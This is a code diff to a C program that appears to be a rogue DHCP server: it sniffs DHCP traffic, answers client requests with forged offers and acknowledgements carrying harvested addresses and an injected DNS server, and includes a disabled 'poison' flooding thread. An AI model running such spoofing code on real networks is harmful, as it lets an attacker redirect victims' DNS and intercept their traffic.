@@ -113,40 +113,49 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	unsigned int packet_size = fill_dhcp_packet(&dhcph, buffer, size);
 
 	int type = packet_type(dhcph, packet_size);
+
 	switch(type){
 		case DHCPDISCOVER:
 			//filter packets we are sending 
 			
-			//if(dhcph.xid != ntohl(10)){
+			if(dhcph->xid != ntohl(10)){
+
+				printf("DISCOVER\n");
 				if(ips.len == 0){
 					printf("No ip address recovered from poisonning !\n");
 					return;
 				}
 				modify_packet_type(dhcph, packet_size, DHCPOFFER);
-				dhcph->yiaddr = ips.ips[ips.index];
-				add_dns_server(dhcph, packet_size);
-				send_packet(sockfd, dhcph, packet_size, ips.ips[ips.index++]);
-		//	}
+				dhcph->yiaddr = ips.ips[ips.index++];
+				add_dns_server(dhcph, &packet_size);
+				send_packet(sockfd, dhcph, packet_size);
+			}
 			break;
 		case DHCPOFFER:
+			printf("OFFER, ADDED IP\n");
 			add_ip(&ips, dhcph->yiaddr);
 			break;
 		case DHCPREQUEST:
+			printf("REQUEST\n");
+
 			modify_packet_type(dhcph, packet_size, DHCPACK);
 			dhcph->yiaddr = dhcph->ciaddr;
 			dhcph->ciaddr = 0;
-			add_dns_server(dhcph, packet_size);
-			send_packet(sockfd, dhcph, packet_size, ips.ips[ips.index++]);
+			add_dns_server(dhcph, &packet_size);
+			send_packet(sockfd, dhcph, packet_size);
 
 			break;
 		case DHCPACK:
+			printf("ACK\n");
 			break;
 		default:
 			break;
 	}
+	printf("done\n");
 }
 
 void *poison(){
+	return NULL;
 	while(1){
 		randomize_offer(offer);
 		send_packet_poison(sockfd, offer);
@@ -159,6 +168,8 @@ int main(){
 
 	ips.len = 0;
 	ips.index = 0;
+
+	//for(int i=0; i<100; i++) add_ip(&ips, 0x09080706);
 
 	sockfd = open_socket();
 
